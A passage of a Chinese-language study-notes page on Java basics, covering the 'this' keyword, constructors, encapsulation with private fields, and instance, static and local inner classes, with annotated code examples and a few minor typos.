class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="this"><a href="#this" class="headerlink" title="this"></a>this</h2><ul><li>this的类型：对应类类型引用，即哪个对象调用就是哪个对象的引用类型</li><li>this只能在成员方法中使用</li><li>在成员方法中，this只能引用当前对象，不能再引用其它对象</li><li>this是成员方法第一个隐藏的参数，编译器会自动传递，在成员方法执行时，编译器会负责将调用成员方法对象的引用传递给该成员方法，this来接收</li></ul> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> year;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> month;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> day;</span><br><span class="line">    <span class="comment">//this.day = 1会报错</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getData</span><span class="params">(<span class="type">int</span> year, <span class="type">int</span> month, <span class="type">int</span> day)</span> &#123;</span><br><span class="line">        year = year;</span><br><span class="line">        month = month;</span><br><span class="line">        day = day;</span><br><span class="line">    &#125;<span class="comment">//这里局部变量会被回收，局部变量优先，这里只是自己给自己赋值了</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getData1</span><span class="params">(<span class="type">int</span> year, <span class="type">int</span> month, <span class="type">int</span> day)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.year = year;</span><br><span class="line">        <span class="built_in">this</span>.month = month;</span><br><span class="line">        <span class="built_in">this</span>.day = day;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printData</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(year + <span class="string">&quot;/ &quot;</span> + month + <span class="string">&quot;/ &quot;</span> + day);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printData1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.year + <span class="string">&quot;/ &quot;</span> + <span class="built_in">this</span>.month + <span class="string">&quot;/ &quot;</span> + <span class="built_in">this</span>.day);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">cal</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">cal</span>();</span><br><span class="line">        <span class="type">cal</span> <span class="variable">c2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">cal</span>();</span><br><span class="line">        <span class="type">cal</span> <span class="variable">c3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">cal</span>();</span><br><span class="line"></span><br><span class="line">        c1.getData(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>); <span class="comment">// 0/0/0</span></span><br><span class="line">        c2.getData1(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>);<span class="comment">// 1 / 1/ 1</span></span><br><span class="line">        c3.getData1(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        c1.printData1();</span><br><span class="line">        c2.printData1();</span><br><span class="line">        c3.printData1();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">cal</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">cal</span>();</span><br><span class="line">        <span class="comment">//c1.getData(1,1,10);</span></span><br><span class="line">        <span class="comment">//c1.getData1(2023,6,6);</span></span><br><span class="line">        <span class="comment">/*c1.month=2;</span></span><br><span class="line"><span class="comment">        c1.year=1;</span></span><br><span class="line"><span class="comment">        c1.day=3;*/</span></span><br><span class="line">        c1.printData();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="作业-1"><a href="#作业-1" class="headerlink" title="作业"></a>作业</h3> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Stu</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setInof</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;My name is &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.myName();</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Stu</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>();</span><br><span class="line">        stu.setInof(<span class="string">&quot;yxz&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        stu.myName();</span><br><span class="line">        stu.myInfo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Stu</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;yxz&quot;</span>;<span class="comment">//就地初始化，但只适合默认的一些量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setInof</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;My name is &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Stu</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//要写在第一条</span></span><br><span class="line">        <span class="built_in">this</span>(<span class="string">&quot;yxz&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;不带参数的构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Stu</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;<span class="comment">//构造方法可以重载1.方法名相同，2.参数列表不同3.返回值不一定相同</span></span><br><span class="line">        <span class="comment">//this();//不能循环调用</span></span><br><span class="line">        System.out.println(<span class="string">&quot;带俩个参数的构造犯法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.myName();</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Stu</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>();<span class="comment">//实例化时一定会调用构造方法，若没有提供，编译器会提供一个</span></span><br><span class="line">        <span class="type">Stu</span> <span class="variable">stu2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>(<span class="string">&quot;yxz&quot;</span>, <span class="number">12</span>);<span class="comment">//构造方法调用完成后，对象才实际上产生</span></span><br><span class="line">        <span class="comment">//stu.setInof(&quot;yxz&quot;, 12);//引用类型默认值是null</span></span><br><span class="line"><span class="comment">/*        stu.myName();</span></span><br><span class="line"><span class="comment">        stu.myInfo();*/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String add;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;姓名：&quot;</span> + name + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot; 年龄：&quot;</span> + age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">pe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        pe.setName(<span class="string">&quot;yxz&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="private"><a href="#private" class="headerlink" title="private"></a>private</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Alpha</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> iamprivate;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Alpha</span><span class="params">( <span class="type">int</span> i)</span>&#123;</span><br><span class="line">        iamprivate=i;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isEqualTo</span><span class="params">(Alpha anotherAlpha)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.iamprivate == anotherAlpha.iamprivate)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">       Alpha aa=<span class="keyword">new</span> <span class="title class_">Alpha</span>(<span class="number">10</span>);</span><br><span class="line">       Alpha bb=<span class="keyword">new</span> <span class="title class_">Alpha</span>(<span class="number">12</span>);</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">if</span>(aa.isEqualTo(bb))&#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;equal &quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;not equal &quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果是nuo equal </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mport java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">while</span> (scanner.hasNextInt()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">            p.setAge(age);</span><br><span class="line">            System.out.println(p.getAge());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//write your code here......</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.age &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.age &gt; <span class="number">200</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">200</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Outer</span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 定义内部类Inner */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inner</span>&#123; </span><br><span class="line">    </span><br><span class="line">        <span class="comment">//将外包类的成员变量size递增</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doStuff</span><span class="params">()</span>&#123; </span><br><span class="line">            size++;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Inner i=<span class="keyword">new</span> <span class="title class_">Inner</span>(); <span class="comment">//成员变量i指向Inner类的对象</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">increaseSize</span><span class="params">()</span>&#123; </span><br><span class="line">        i.doStuff(); <span class="comment">//调用内部类Inner的方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] a)</span>&#123; </span><br><span class="line">        Outer o=<span class="keyword">new</span> <span class="title class_">Outer</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i&lt;<span class="number">4</span>; i++)&#123;</span><br><span class="line">           o.increaseSize();</span><br><span class="line">           System.out.println(<span class="string">&quot;The value of size : &quot;</span>+o.size);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Outer</span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 定义内部类Inner */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inner</span>&#123; </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> size;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doStuff</span><span class="params">(<span class="type">int</span> size)</span>&#123; </span><br><span class="line">            size++; <span class="comment">//存取局部变量</span></span><br><span class="line">            <span class="built_in">this</span>.size++;  <span class="comment">//存取内部类的成员变量</span></span><br><span class="line">            Outer.<span class="built_in">this</span>.size++; <span class="comment">//存取其外包类Outer的成员变量</span></span><br><span class="line">            System.out.println(<span class="string">&quot;size in Inner.doStuff(): &quot;</span>+size);</span><br><span class="line">            System.out.println(<span class="string">&quot;size of the Inner class: &quot;</span>+<span class="built_in">this</span>.size);</span><br><span class="line">            System.out.println(<span class="string">&quot;size of the Outer class:  &quot;</span>+Outer.<span class="built_in">this</span>.size);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Inner i=<span class="keyword">new</span> <span class="title class_">Inner</span>(); <span class="comment">//成员变量i指向Inner类的对象</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">increaseSize</span><span class="params">(<span class="type">int</span> s)</span>&#123; </span><br><span class="line">        i.doStuff(s); <span class="comment">//调用内部类Inner的方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] a)</span>&#123; </span><br><span class="line">        Outer o=<span class="keyword">new</span> <span class="title class_">Outer</span>();</span><br><span class="line">        </span><br><span class="line">        o.increaseSize(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Outer</span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> size=<span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 方法makeInner()，返回一内部类对象 */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">makeInner</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> finalLocalVar)</span>&#123; </span><br><span class="line">        <span class="type">int</span> LocalVar=<span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Inner</span>&#123; </span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123; </span><br><span class="line">                <span class="keyword">return</span> (<span class="string">&quot;#&lt;Inner size=&quot;</span>+size+</span><br><span class="line">                 </span><br><span class="line">                <span class="string">&quot; finalLocalVar=&quot;</span>+finalLocalVar+<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Inner</span>(); <span class="comment">//方法makeInner()返回一内部类对象</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Outer outer=<span class="keyword">new</span> <span class="title class_">Outer</span> ();</span><br><span class="line">        Object obj=outer.makeInner(<span class="number">40</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;The object is &quot;</span>+obj.toString());</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OuterClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> data1;</span><br><span class="line">    <span class="type">int</span> data2;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> data3;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;OuterClass:;test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//实例内部类</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">InnerClass</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="variable">data1</span> <span class="operator">=</span> <span class="number">122</span>;<span class="comment">//就近原则，若非要外部类中的data1则可以用Outer.this.data1;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> data4;</span><br><span class="line">        <span class="type">int</span> data5;</span><br><span class="line">        <span class="comment">//public static int data5; // error static是类的成员，Inner和成员是一级的</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">data6</span> <span class="operator">=</span> <span class="number">6</span>;<span class="comment">//但需要更高的版本，加上final变成常量了</span></span><br><span class="line">        <span class="comment">//实力内部类当中，不能有静态成员变量，非要定义用final</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">func</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;InnerClass::func()&quot;</span>);</span><br><span class="line">            System.out.println(OuterClass.<span class="built_in">this</span>.data1);</span><br><span class="line">            System.out.println(data2);</span><br><span class="line">            System.out.println(data3);</span><br><span class="line">            System.out.println(data4);</span><br><span class="line">            System.out.println(data5);</span><br><span class="line">            System.out.println(data6);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Inner&quot;</span>);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">10</span>;<span class="comment">//定义常量，在编译时就确定了，一旦初始化，不能修改</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">OuterClass</span> <span class="variable">oc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OuterClass</span>();</span><br><span class="line">        System.out.println(oc.data1);</span><br><span class="line">        OuterClass.<span class="type">InnerClass</span> <span class="variable">ic</span> <span class="operator">=</span> oc.<span class="keyword">new</span> <span class="title class_">InnerClass</span>();<span class="comment">//获取实例内部类对象</span></span><br><span class="line">        ic.func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>外部类中的任何成员都可以在实例内部类方法中直接访问</li><li>实力内部类所在位置与外部类成员位置相同，因此也受public 等访问限制符的约束</li><li>在实例内部类中访问同名的成员时优先访问自己的，如果要访问外部类的同名成员，必须用：外部类名.this.同名成员来访问</li><li>实例内部类对象必须是在先有外部类对象的前提下才能创建</li><li>实力内部类的非静态方法包含了一个指向外部类的引用</li><li>外部类中，不能直接访问实例内部了中的成员，如果要访问不许先创建内部类的对象</li></ul><h2 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OuterClass2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">data1</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">data2</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">data3</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;out::test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">InnerClass2</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="variable">data4</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">data5</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">data6</span> <span class="operator">=</span> <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">func</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;inn::test&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*System.out.println(this.data1);</span></span><br><span class="line"><span class="comment">            System.out.println(data2);*/</span><span class="comment">//无法访问外部类的非静态成员</span></span><br><span class="line">            <span class="comment">//非要访问</span></span><br><span class="line">            <span class="type">OuterClass2</span> <span class="variable">oc3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OuterClass2</span>();</span><br><span class="line">            System.out.println(oc3.data1);</span><br><span class="line">            System.out.println(data3);</span><br><span class="line">            System.out.println(data4);</span><br><span class="line">            System.out.println(data5);</span><br><span class="line">            System.out.println(data6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        OuterClass2.<span class="type">InnerClass2</span> <span class="variable">oc2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OuterClass2</span>.InnerClass2();<span class="comment">//这样不需要先创建外部类对象</span></span><br><span class="line">        oc2.func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>静态内部类中只能访问外部类中的静态成员</li><li>非要访问，得新建一个外部类对象</li><li>创建静态内部类是不需要创建外部类对象</li></ul><h2 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Inner</span> &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;dasdsadsad&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Inner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Inner</span>();</span><br><span class="line">        in.test();<span class="comment">//只能在方法中使用</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span 